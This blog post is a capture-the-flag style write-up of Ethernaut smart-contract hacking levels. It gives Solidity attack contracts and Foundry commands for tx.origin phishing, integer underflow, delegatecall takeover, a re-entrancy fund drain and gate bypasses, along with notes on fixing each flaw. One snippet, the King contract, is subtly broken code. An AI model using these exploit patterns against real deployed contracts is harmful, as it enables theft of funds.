---
layout: post
title:  "Completing Ethernaut Series: Part I"
date:   2022-09-13
categories: 
---
* TOC 
{:toc}
[Ethernaut ](https://ethernaut.openzeppelin.com/) is a Solidity game where each level needs to be "hacked" by finding some vulnerability in an Ethereum smart contract. I found this to be an engaging way to learn the basics behind Ethereum smart contracts. Currently, there are 27 levels of varying difficulty. Below are brief notes on how I completed each level. While there are already many solution write-ups out there, most use Hardhat while this writeup uses Foundry (see [previous blog](http://axucar.ca/2022/09/09/foundryexplain/)) to test and interact with the game.

****
# Fallback

The fallback function allows contracts to receive Ether. To trigger fallback function in a contract:

1. call function that doesn’t exist within the contract (or omitting required data)
2. send ether without any data to the contract

Note that the `receive()` function, if it exists in the contract, gets called instead of `fallback()` if `msg.data` is empty but `msg.value` is positive, as will be the case in this level.

We see there are two options to gaining ownership of the contract (ie. to set `owner=msg.sender`). Either we contribute more than 1000 ether (which would take weeks of requesting on testnet faucet), or we pass the requirement in the `receive()` function: `require(msg.value > 0 && contributions[msg.sender] > 0)` . Thus, the steps are:

- Call `contribute` with some arbitrary positive `msg.value`
    - `cast send <challenge_addr> "contribute()" --value 777`
    - Note that the `msg.value` is in `wei = 1e-18 ether`
- Send some ether without any data, ie. empty `msg.data`, to trigger the `receive()` function
    - `cast send <challenge_addr> --value 555`
    - Now, the owner should be us: `cast call <challenge_adddr> "owner()(address)"`
- Withdraw entire contract balance of ether `cast send <challenge_addr> "withdraw()"`

As a side detail, I did not use a keystore since I wanted to use an existing account on Metamask so I set up the `$PRIVATE_KEY` environment variable in an `.env` file and append  `--private-key $PRIVATE_KEY` to the `cast send` commands that publish a transaction.

Lesson here is one should be careful when changing contract ownership within a fallback function, or transferring out funds inside fallback function because anyone can trigger fallback function.

****
# Fallout

The `Fal1out` function (which was meant as a constructor) is mispelled and doesn't match the contract name `Fallout`! Therefore, we can still call the constructor function which sets `owner = msg.sender`.

- `cast send <challenge_addr> "Fal1out()" --value 777`

This happened in the Rubixi hack incidence, the developers changed the contract’s name from `Dynamic Pyramid` to `Rubixi`. However, they forgot to rename the constructor function to `Rubixi()`, allowing anyone to become the owner and withdraw funds. This is less relevant now that the standard is to use the reserved `constructor` [keyword](https://solidity-by-example.org/constructor/).

****
# Coin Flip

The key is that `block.number` can be known since an attack can execute `flip()` within same block.
- Note that `using SafeMath for uint256` is not required after solidity 0.8.x.
- Deploy contract below `forge create src/AttackCoinflip.sol:AttackCoinflip --verify`    
    - `--verify` uploads the verified source code to Etherscan

```solidity
pragma solidity 0.8.10;

interface ICoinFlip{
    function flip(bool _guess) external returns(bool);
}

contract AttackCoinflip{  
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;		
    address coinflipAddress = 0x07d53476B965f9A594152D85B0e1cfbAc370503f;
    ICoinFlip public coinflipContract = ICoinFlip(coinflipAddress);
    function flip() external {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinflipContract.flip(side);
    }
}
```

- Call `flip()` 10x via `cast send <challenge_addr> "flip()" --gas-limit 300000`

****
# Telephone

- Call `changeOwner` from a smart contract instead of my wallet
    - So `tx.origin ≠ msg.sender` since `msg.sender` would be contract address, but `tx.origin` is the signer of the originating transaction (ie. externally-owned account (EOA) derived from a private key)
    - Only wallets (EOAs) can be `tx.origin`, not contracts, whereas either one can be `msg.sender`
- `forge create --private-key $PRIVATE_KEY src/AttackTelephone.sol:AttackTelephone`

```solidity
pragma solidity 0.8.10;

interface ITelephone{
    function changeOwner(address _owner) external;
}

contract AttackTelephone{  
    address telephoneAddress = 0x16a5385C66f06D6190eAbD5979816317f314Fe4C;
    ITelephone public telephoneContract = ITelephone(telephoneAddress);
    function attack() external {
        telephoneContract.changeOwner(msg.sender);
    }
}
```

`cast send --private-key $PRIVATE_KEY <challenge_addr> "attack()"`

- Avoid phishing attacks by avoiding authenticating using `tx.origin`. Instead, always use `msg.sender` to authenticate (see [here](https://solidity-by-example.org/hacks/phishing-with-tx-origin/))
    - For instance, a vulnerability occurs when an attacker convinces victim to send him/her some small amount of ether `_amount`, triggering a malicious fallback function that transfers the funds of victim `tx.origin` to attacker.     
    - We should replace `tx.origin` (victim) with `msg.sender` (attacker contract) in the require statement 

    
```solidity
//A Wallet contract (bad) transfer method
function transfer(address payable _to, uint _amount) public {
    require(tx.origin == owner);

    (bool sent, ) = _to.call{value: _amount}("");
    require(sent, "Failed to send Ether");
}
```
    
```solidity
//attacker contract's fallback function
function () payable {
    wallet.transfer(attackerAddress, address(wallet).balance);
}
```
****

# Token

We exploit integer underflow/overflow with uint! Because we are dealing with unsigned ints: the require statement `require(balances[msg.sender] - _value >= 0)` is always true.

```solidity
mapping(address => uint) balances;
...
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
```

We need a `msg.sender` that is not us (the `player` address) to subtract `value` amount.
- `forge create src/AttackToken.sol:AttackToken`
- `cast send <challenge_addr> "attack()" --gas-limit 300000`
    - ie. `msg.sender` in the `transfer` function will be the attack contract we deployed


```solidity
pragma solidity 0.8.10;

interface IToken{
    function transfer(address _to, uint _value) external returns (bool);
}

contract AttackToken{  	
    address tokenAddress = 0x007E0ef5B081961Dc6D5b92fF375Dd077A7C1F33;
    IToken public tokenContract = IToken(tokenAddress);
    address sendTo = 0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1; //player address

    function attack() external {		
        tokenContract.transfer(sendTo,2**256 - 21); //sentTo has 20 already
    }
}
```
Note that the `player` starts with 20 tokens, hence sending `2**256 - 21` to it. This results in `player` address having the maximum `uint256 `balance of `2**256 - 1` tokens. Alternatively, we could've sent 21 tokens from `player` to anyone else, causing integer underlow. 

****

# Delegation

Recall that `call` in Solidity is a low level [function](https://solidity-by-example.org/call/) to interact with other contracts
- Takes encoded function signature and args as the parameter (the encoded payload `abi.encodeWithSignature(func_sig, args)` becomes `msg.data` in the contract being called) \
- For instance, `(bool success, bytes memory data) = _addr.call{value: msg.value, gas: 5000}(abi.encodeWithSignature("foo(string,uint256)", "asdf", 123));` effectively calls `foo(string,uint256)` in the `_addr` contract
    - As usual, if `foo(string,uint256)` doesn’t exist, it will trigger the fallback function in `_addr` contract
- Similarly, `delegatecall` executes code of another contract, but when contract `A` executes `delegatecall` to contract `B`, `B`'s code is executed
**with contract `A`'s storage, `msg.sender` and `msg.value`**. See here for [delegatecall example](https://solidity-by-example.org/delegatecall/).

ABI-encoding compresses function and arguments into type `bytes` which is displayed in hex.
- `cast calldata "pwn()”` = 0xdd365b8b, known as the method id (8 hex characters = 4 bytes). The reverse operation is called `cast 4byte 0xdd365b8b`  which returns function signature for the given selector `pwn()`
    - `cast calldata “baz(uint32,bool)” 69 true`
        - `0xcdcd77c0`, again 8 hex = 4 bytes
        - 69 is `0x0000000000000000000000000000000000000000000000000000000000000045`, 64 hex characters = 32 bytes
        - `true` is `0x0000000000000000000000000000000000000000000000000000000000000001`, also 64 hex

To solve this level:
- Get ABI-encoding of "pwn()": `cast calldata "pwn()”` = 0xdd365b8b 
- `cast send <challenge_addr> 0xdd365b8b --gas-limit 300000`
    - calls `pwn()` on `Delegation` contract which does not exist, so fallback function of `Delegation` gets called. 
    - Then, `delegatecall` is executed on `Delegate` contract with`pwn()` function (encoded in bytes) as the `msg.data=0xdd365b8b`. Thus, we execute the `pwn()` function but on the `Delegation`'s storage which sets its `owner` variable to our `player` address.

****

# Force

This level simply illustrates that you can force sending ether to a contract that does not have any payable functions, by using `selfdestruct` of another contract.
- `forge create src/Force.sol:ForceSend --value 1 --constructor-args <challenge_addr>`
    - note we pre-funded the contract with 1 wei, which was sent to target contract, before self-destructing in the same tx

```solidity
pragma solidity ^0.8.0;
contract ForceSend {
    constructor (address payable _target) payable {
        require(msg.value>0);
        selfdestruct(_target);
    }
}
```

****
# Vault

We need to get raw value of contract's second storage slot, since the storage slots are laid out in the order that the variables are defined. 
- Hence, `locked` corresponds to the first slot, and `bytes32` corresponds to the second. 
    - Details on the subtleties of the storage layout (such as packing multiple variables of size < 32 bytes into one slot) can be found [here](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html).
- `cast storage <challenge_addr> 1`
    - equivalent to `ethers.provider.getStorageAt(addr,1)` in Javascript's `ethers` library.

****

# King

To break this Ponzi game, we make our attack contract unable to receive tokens.
- use `revert()` in the `receive()` payable function, which means no one can reclaim the kingship from us
- `forge create src/AttackKing.sol:AttackKing --value 0.001ether --constructor-args <challenge_addr>`

```solidity
pragma solidity ^0.8.0;

contract AttackKing{
	require(msg.value >= 0.001 ether, "please send >= 0.001 ether");
	constructor(address payable _sendTo) public payable {
		_sendTo.call{value:msg.value}("");
	}
	receive() external payable {
		revert();
	}
}
```

****

# Re-entrancy

This is the same exploit that led to the famous [DAO hack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). Due to sending funds before updating internal state, the malicious contract is able to keep calling the `withdraw` function via a malicious fallback/receive function. To fix the vulnerability, we could update the internal `balances` state before calling the ether transfer, ensuring safe re-entry into the `withdraw` function.

When `msg.sender.call{value:_amount}("")` is processed, the control is handed back to the `receive` function in our originating attacking contract, which keeps calling `withdraw` function until we empty the victim contract.
- Remember to make fallback function payable (or alternatively, use a payable `receive()` function)
- `forge create src/AttackReentrancy.sol:AttackReentrancy --verify`
- `cast send <challenge_addr> "attack()" --gas-limit 300000 --value 0.001ether`

```solidity
pragma solidity ^0.8.10;

interface IReentrance{
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract AttackReentrancy{    
    address contractAddress = 0xABF83aD603829851f6cc631D4bcCD084b0EAedb9;
    IReentrance public challengeContract = IReentrance(contractAddress);
    uint amount; 

    receive() external payable {
        drain();
    }
    function attack() external payable {
        amount=msg.value;
        challengeContract.donate{value:amount}(address(this));
        challengeContract.withdraw(amount);
    }
    function drain() private {
        uint remainingBalance = address(challengeContract).balance;
                                
        if(remainingBalance > 0) {
            uint toWithdraw = (remainingBalance > amount? amount:remainingBalance);
            challengeContract.withdraw(toWithdraw);
        }
    }
}
```
****

# Elevator

Since `Elevator.sol` never implemented `isLastFloor` from the `Building` interface, we can create a `Building` contract that implements the function. So, when we invoke `goTo` from our `Building` contract, it will use our definition of `isLastFloor`.
- the `goTo(uint)` function calls `isLastFloor` twice, and we need it to return `false`, then `true`. We can just store a counter variable `timesCalled`
- `forge create src/AttackElevator.sol:Building --verify`

```solidity
pragma solidity ^0.8.10;

interface IElevator{
    function goTo(uint _floor) external;
}

contract Building{    
    uint timesCalled;        
    IElevator public elevator;
    
    function isLastFloor(uint) external returns (bool) {
        timesCalled++;
        if (timesCalled > 1){
            return true;    
        }
        else {return false;}
    }
    function attack(address _victim) public {
        elevator = IElevator(_victim);
        elevator.goTo(1);
    }
}
```
****
# Privacy

Each storage slot in Ethereum contracts is 32 bytes. The first bool will take the entire first slot, since the following `uint256` variable = 256 bits = 32bytes so it also occupies its own slot. Both `uint8` variables, and the following `uint16` can be packed together into one slot. We thus need to take the 6th slot, corresponding to `data[2]` which is a `bytes32` type.
- `cast storage <challenge_addr> 5` returns `bytes32 data[2]` = `0xf92a248e0a7e36a498030961667f3e29 ba5029a60fec66b27534a24225ad5241`
- big endian ordering (stored starting on left side) applies for strings and bytes, while little endian (start storing on the right) applies for bool, numbers, addresses
- Hence, `byte16(data[2])` = `0xf92a248e0a7e36a498030961667f3e29` (ie. take the left-half due to big-endian order for `bytes32` type)    
- `cast send <challenge_addr> "unlock(bytes16)" 0xf92a248e0a7e36a498030961667f3e29` solves the challenge

****
# Gatekeeper One

To satisfy `gateOne()`, we simply need to call `enter(_gateKey)` from a contract that we deploy.
As for `gateThree`, we need a `bytes8` key (16 hex characters) satisfying each of the 3 require statements.
- `uint32(uint64(_gateKey)) == uint16(tx.origin)` implies that the last 8 hex characters of the key have to equal the last 4 hex characters of `tx.origin` (a9E1 for me)
    - `0x????????0000a9E1` works. Recall that casting down for ints follows little endian (keep rightmost characters)
- `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))` implies that last 8 hex characters of the key have to equal the last 4 hex characters 
    - `0x????????0000a9E1` still works
- `uint32(uint64(_gateKey)) != uint64(_gateKey)` implies that the last 8 hex characters of the key cannot equal the full 16 hex characters
    - `0xFFFFFFFF0000a9E1` as the final `_gateKey` satisfies this, since `0xFFFFFFFF0000a9E1 != 0x0000a9E1`

As shown below, you can use `console.log` as done in my [test script](https://github.com/axucar/ethernaut-forge/blob/main/test_archive/GatekeeperOne.t.sol#L19-L22) to verify that the key works. See [previous blog](http://axucar.ca/2022/09/09/foundryexplain/#test-locally-using-foundry) on how to run Foundry tests locally for debugging purposes by forking the live testnet.

```solidity
// test/GatekeeperOne.t.sol
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "src/AttackGatekeeperOne.sol";

contract ContractTest is Test {
    AttackGatekeeperOne gkp;
    function setUp() public {
        gkp = new AttackGatekeeperOne(0x590aAf34f517B1ADc569bfB48420227FE0D0ceD8);
    }

    function testGatekeeper() public{
        bytes8 _key = 0xffffffff0000a9E1; 
        vm.startPrank(0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1,0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1);

        console.logBytes8(_key);
        console.log("uint16(uint64(_key)): %s", uint16(uint64(_key)) );
        console.log("uint32(uint64(_key)): %s", uint32(uint64(_key)) );
        console.log("uint64(_key): %s", uint64(_key));
        console.log("uint16(tx.origin): %s", uint16(uint160(0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1)));

        gkp.attack(_key,0);
        vm.stopPrank();
    }
}
```
```text
Logs:
0xffffffff0000a9e1
uint16(uint64(_key)): 43489
uint32(uint64(_key)): 43489
uint64(_key): 18446744069414627809
uint16(tx.origin): 43489
```

Finally, we need to satisfy `gateTwo`, in my opinion the most challenging of the 3 modifiers. 
Commands to solve the challenge:
- `forge create src/AttackGatekeeperOneExact.sol:AttackGatekeeperOneExact --verify --constructor-args <challenge_contract>`
- `cast send <attacker_contract> "attack(bytes8,uint256)" 0xffffffff0000a9E1 82164 --gas-limit 600000`

```solidity
pragma solidity ^0.8.10;

contract AttackGatekeeperOneExact {
    address public victim;

    constructor(address _victim) {
        victim = _victim;
    }   

    function attack(bytes8 _key, uint256 _gasLevel) public returns(bool){
        //0xffffffff0000a9E1
        require(uint32(uint64(_key)) == uint16(uint64(_key)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_key)) != uint64(_key), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_key)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");

        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = victim.call{gas: _gasLevel + 8191*10}(payload);
        require(success, "failed");
        return success;
    }

}
```
**Question**: how did we know the `_gasLevel` parameter in the attack function should be 82164?
The answer is that we fork the live testnet to log the correct gasLevel in a for-loop. Forking a live testnet means we don't need to do any setup to simulate the actual gas usage, as all the relevant contracts (ie. the challenge contract) are deployed. Instead of running the for-loop in live testnet (as I've seen some tutorials do, wasting testnet ETH and also taking more time to test), we can debug gas using foundry’s `forge test -vvvv --rpc-url $ETH_RPC_URL`. Replace the line `(bool success,) = victim.call{gas: _gasLevel + 8191*10}(payload);` with the for loop clause below:


```solidity
//src/AttackGatekeeperOne.sol (with loop for testing)
import "forge-std/Test.sol";
...
for (uint256 i=0; i<300; i++){
    (success,) = victim.call{gas: i + _gasLevel + 8191*10}(payload);
    if(success){
        console.log(i + _gasLevel + 8191*10); 
        break;
    }
}
```

# Gatekeeper Two

As with Gatekeeper One, `gateOne()` is trivial (call `enter` using a contract). 
For `gateTwo()`, we see that `assembly { x := extcodesize(caller()) }` and `require(x==0)`, so somehow the size of the code of our attack contract must be 0. 
- The workaround is to call all the functions within the constructor (since code size is still 0 while still inside the construction clause).    

Finally, for `gateThree`, we have `require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1)` which can be rewritten as `require(a ^ b == c)`, which we prove is equivalent to `require(b == a ^ c)` below. 
- ```solidity
a ^ b == c
a ^ b ^ (b ^ c) == c ^ (b ^ c)
a ^ (b ^ b) ^ c == (c ^ c) ^ b
a ^ 0 ^ c == 0 ^ b
a ^ c == b
```
- Since `solidity ^0.8.0`, there is underflow and overflow checking, so `uint(64)-1` has to be written as `type(uint64).max`


```solidity
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

contract AttackGatekeeperTwo {
    address public victim;
    
    constructor(address _victim) {
        victim = _victim;
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max)); 
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = victim.call(payload);

        uint x;
        assembly { x := extcodesize(address()) }
        console.log("extcodesize at constructor is: %s",x);

        require(success, "failed");
    }
}
```
